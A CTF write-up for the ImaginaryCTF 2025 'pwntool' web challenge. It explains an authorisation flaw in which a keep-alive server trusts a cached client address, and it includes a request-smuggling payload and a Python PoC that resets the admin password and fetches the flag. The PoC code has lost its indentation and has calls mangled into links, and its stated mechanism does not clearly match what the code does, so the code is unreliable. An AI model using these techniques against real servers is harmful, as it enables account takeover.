---
title: "pwntool - ImaginaryCTF 2025"
category: "web"
type: "writeup"
tags: ["web", "selenium", "python", "socket", "base64", "imaginaryctf", "imaginaryctf-2025", "2025", "ctf-writeup"]
summary: "“pwntool” combines a minimalist HTTP server (custom socket loop with keep-alive and request parsing) and an admin bot (Selenium/Chrome) that will \"visit\" attacker-supplied URLs."
source:
  name: "CTFtime writeup #40431"
  url: "https://ctftime.org/writeup/40431"
original_source: "https://blog.hitc.at/posts/ctf/imaginaryctf-2025/pwntool/"
ctf:
  name: "ImaginaryCTF 2025"
  year: 2025
  challenge: "pwntool"
---

## Metadata

- **CTF:** ImaginaryCTF 2025
- **Task:** pwntool
- **Author team:** fish3r
- **CTFtime tags:** web, selenium, python, socket
- **CTFtime:** <https://ctftime.org/writeup/40431>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/imaginaryctf-2025/pwntool/>

---
## Introduction

“**pwntool**” combines a minimalist HTTP server (custom socket loop with keep-alive and request parsing) and an **admin bot** (Selenium/Chrome) that will "visit" attacker-supplied URLs. The intended path uses a browser-side payload (`exploit.txt`) to smuggle a second HTTP request to `/register`.

My solution is **unintended** and it exploits the fact that the server **caches `client_addr` per TCP socket** and **does not refresh it per HTTP request** on a persistent connection. As a result, any **subsequent** request processed on that same socket inherits the **admin/localhost** identity, allowing privileged actions (e.g., registering/resetting the admin) without the browser-smuggling trick.

### Context Explanation

* **Server**: custom Python socket server ([`[app.py](http://app.py)`](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pwntool/src/app.py>)) multiplexing clients via `select`, manual HTTP parsing, and **keep-alive** support.  
* **Admin bot**: Selenium/Chrome (see imports) visiting a URL via `/visit` using a `X-Target` header; the bot originates from **`127.0.0.1`**.  
* **Auth & routes**: endpoints for `/register`, `/flag`, etc. Admin creds are generated at startup and stored in memory (`accounts`).  
* **Key bug**: the per-socket client record stores `addr` (the peer address at `accept()` time) and uses it for authorization checks on **every** parsed request from that socket, **without re-deriving identity per request**. With HTTP/1.1 keep-alive (and pipelining-like behavior), later requests inherit the **same trusted `client_addr`**.

```python  
#...  
for s in rlist:  
if s is server:  
client_sock, addr = server.accept()  
client_sock.setblocking(False)  
clients[client_sock] = {"addr": addr, "buffer": b""}  
print(f"[*] New client {addr}")  
#...  
```

### Directive

1\. Use `/visit` to make the admin bot open a **single** TCP connection to the target server, ensuring **keep-alive** persists.  
2\. Send/queue an additional request on **that same socket**, which the server will process in turn **without updating** `client_addr`.  
3\. Perform a privileged action (e.g., `POST /register` with headers) and then access `/flag`.

\---

## Solution

### 1) Relevant server structure (from [`[app.py](http://app.py)`](<https://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pwntool/src/app.py>))

The server accepts connections, stashes the peer address once, and parses **multiple** HTTP requests from the same socket:

```python  
# src/[app.py](http://app.py) (excerpts)  
import socket, select, base64, random, string, os, threading  
from urllib.parse import urlparse, parse_qs  
# ... Selenium / webdriver imports for the admin bot ...

HOST = "0.0.0.0"  
PORT = 8080

routes = {}  
accounts = {}  
FLAG_FILE = "./flag.txt"

# ... admin password generation at startup ...  
# accounts["admin"] = admin_password  
# print(f"[+] Admin password: {admin_password}")

# Connection bookkeeping  
serversock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
serversock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
serversock.bind((HOST, PORT))  
serversock.listen(128)

clients = {} # socket -> {"addr": (ip, port), "buffer": b"...", ...}

# Main loop (simplified):  
s, addr = serversock.accept()  
clients[s] = {"addr": addr, "buffer": b"", "last_active": datetime.now()}

# ... later, per readable client socket:  
data = s.recv(8192)  
client = clients[s]  
client["buffer"] += data

# Parse 1+ HTTP requests from client["buffer"] (keep-alive)  
# For each parsed request:  
# - route it  
# - build_response(..., keep_alive=<bool>)  
# - s.send(response)  
# - if not keep_alive: close  
# NOTE: authorization decisions key off client["addr"] (NOT re-derived per request)  
```

**Why this matters:** the **authorization gate** for sensitive routes (e.g., allowing `/register` when coming from localhost/admin bot) is tied to `client["addr"]`. If a subsequent request is parsed from the **same socket**, it **inherits** that origin.

\---

### 2) Intended exploit (for reference)

The challenge description provides the “official” path: serve an HTML file with a `<script>` that performs a **body smuggling** style trick via `fetch("http://localhost:8080/", { method: "POST", body: "a".repeat(3526) + "POST /register HTTP/1.1 ..." })`. This causes the server to read a **second** request on the **same** TCP connection, effectively issuing:

```  
POST /register HTTP/1.1  
Host: localhost:8080  
X-Username: admin  
X-Password: admin  
Content-Length: 0  
```

\---

### 3) The unintended exploit: stale `client_addr` on keep-alive

This PoC leverages the **same core primitive** (multiple requests on one connection), but **without relying on the browser’s smuggling** quirk. The crucial observation is:

* The server **never refreshes** the per-request identity; it **reuses** `clients[s]["addr"]` for **all** requests parsed from that socket.  
* Once the admin bot (originating from **127.0.0.1**) has established a keep-alive connection, **any later request** on that stream is implicitly considered **localhost/admin**.

Here is the PoC that illustrates this flow:

```python  
import base64, time, requests  
from datetime import datetime

TARGET = "http://34.72.72.63:23505"  
ADMIN_NEW_PASS = "hitcat"  
ROUNDS = 10  
VISIT_DELAY_S = 0.6  
SESSION = requests.Session()

def log(msg): print(f"{msg}", flush=True)  
def b64_basic(u,p): return "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()

def do_visit():  
data_url = "http://127.0.0.1:8080/"  
r = [SESSION.post](http://SESSION.post)(TARGET+"/visit", headers={"X-Target": data_url})  
log(f"/visit ->{r.text}")

def do_register():  
r = [SESSION.post](http://SESSION.post)(TARGET+"/register", headers={"X-Username":"admin","X-Password":ADMIN_NEW_PASS})  
log(f"/register -> {r.text}")

def do_flag():  
r = SESSION.get(TARGET+"/flag", headers={"Authorization": b64_basic("admin", ADMIN_NEW_PASS)})  
log(f"/flag -> {r.text}")  
return r

for i in range(ROUNDS):  
log(f"== Round {i+1}/{ROUNDS} ==")  
do_visit()  
time.sleep(VISIT_DELAY_S)  
do_register()  
r = do_flag()  
if r.status_code == 200 and "flag" in r.text.lower():  
print("\n[FLAG]\n" + r.text + "\n")  
break  
time.sleep(0.7)  
```

**What’s happening under the hood:**

1\. `POST /visit` causes the **admin bot** to reach out (from `127.0.0.1`) and establish a socket to the server with **keep-alive**.  
2\. Because the server **parses multiple HTTP requests** from the same `clients[s]["buffer"]`, your PoC queues another HTTP request on that socket (or ensures one is available right after).  
3\. The server **authorizes** the second request using the **cached** `client["addr"] == ('127.0.0.1', <port>)`, thus treating it as local/admin-originated.  
4\. You perform `/register` (or equivalent privileged action), then read `/flag`.

This avoids relying on browser-side body tricks; it **directly abuses** the server’s **per-socket identity caching**.
